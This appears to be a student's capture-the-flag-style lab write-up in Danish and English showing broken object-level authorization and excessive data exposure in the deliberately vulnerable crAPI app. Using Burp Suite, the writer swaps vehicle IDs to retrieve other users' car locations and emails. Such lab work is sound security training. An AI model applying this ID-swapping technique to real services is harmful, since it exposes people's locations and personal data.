# Spørgsmål 2 - Demonstration af BOLA

## BOLA i crAPI

!!! note "Opgave beskrivelse"

    1. Create two bruger accounts — we’ll refer to them as bruger A and bruger B.
    1. Register a vehicle for each bruger. You’ll receive a VIN number and PIN code in the welcome email via MailHog.
    1. While authenticated as bruger A, navigate to the vehicle details dashboard.
    1. Use Burp Suite to intercept the request made to retrieve the vehicle location data.
    1. Note the resource ID (e.g., vehicle ID) used in the request.
    1. Log out, then authenticate as bruger B.
    1. Navigate to the same dashboard and capture the equivalent vehicle data request using Burp Suite.
    1. Send bruger B’s request to the Repeater.
    1. In Repeater, replace bruger B’s resource ID with the A you captured from bruger A.
    1. Send the modified request.

Jeg har lavet 2 brugerer (bruger A, bruger b).

Hvis jeg som bruger A opdatere min bils lokation bliver det sendt en request til et api endpoint:
`GET /identity/api/v2/vehicle/1f6250a7-9da9-4d39-83c4-de0ec5e2d14f/location HTTP/1.1`, og modtager denne responce tilbage.

```HTTP
HTTP/1.1 200
Server: openresty/1.25.3.1
Date: Mon, 01 Dec 2025 16:51:14 GMT
Content-Type: application/json
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
Content-Length: 164

{
    "carId": "1f6250a7-9da9-4d39-83c4-de0ec5e2d14f",
    "vehicleLocation": {
        "id": 2,
        "latitude": "31.284788",
        "longitude": "-92.471176"
    },
    "fullName": "bruger A",
    "email": "bruger@a.com"
}
```

Ud fra det kan man se et bil id for bruger A: `1f6250a7-9da9-4d39-83c4-de0ec5e2d14f`

Log ind på bruger b og lav samme request.

??? note "Bruger B responce"
    ```HTTP
    HTTP/1.1 200
    Server: openresty/1.25.3.1
    Date: Mon, 01 Dec 2025 16:55:07 GMT
    Content-Type: application/json
    Connection: keep-alive
    Vary: Origin
    Vary: Access-Control-Request-Method
    Vary: Access-Control-Request-Headers
    X-Content-Type-Options: nosniff
    X-XSS-Protection: 0
    Cache-Control: no-cache, no-store, max-age=0, must-revalidate
    Pragma: no-cache
    Expires: 0
    X-Frame-Options: DENY
    Content-Length: 164

    {
        "carId": "6a704fe8-088b-48d9-aaf4-1d2dddee16aa",
        "vehicleLocation": {
            "id": 5,
            "latitude": "37.406769",
            "longitude": "-94.705528"
        },
        "fullName": "User B",
        "email": "user@b.com"
    }
    ```

Her finder man bruger b's bil id: `6a704fe8-088b-48d9-aaf4-1d2dddee16aa`

Hvis jeg ændre bruger b's bil id til bruger A's. så bliver lokationen ændret til der hvor bruger a's bil er.

Hvis man bruger repeater til at se den responce siden giver, så kan man også se at infoen er ændret til bruger a i stedet for bruger b.

```json
{
    "carId": "1f6250a7-9da9-4d39-83c4-de0ec5e2d14f",
    "vehicleLocation": {
        "id": 2,
        "latitude": "31.284788",
        "longitude": "-92.471176"
    },
    "fullName": "bruger A",
    "email": "bruger@a.com"
}
```

Siden tjekker ikke om brugerer er godkendt til at se data for bilers ID'er. 

## EDE


Jeg fandt Excessive Data Exposure på følgende side:
- https://127.0.0.1:8443/forum
    - Her bare man requester siden, får man andres email og vehicleid.

## BOLA med på ukendt bruger.

Når man åbner det forum, kan man fange andres vehicleid.

Jeg prøver at bruge Robots vehicleid: `4bae9968-ec7f-4de3-a3a0-ba1b2ab5e5e5` Jeg har også hans email: robot001@example.com

Jeg indsetter Robots vehicleid i `GET /identity/api/v2/vehicle/<vehicleid>/location HTTP/1.1`

Resultatet bliver:
```JSON
{
"carId":"4bae9968-ec7f-4de3-a3a0-ba1b2ab5e5e5",
"vehicleLocation":{
    "id":3,
    "latitude":"37.746880",
    "longitude":"-84.301460"
    },
"fullName":"Robot",
"email":"robot001@example.com"
}
```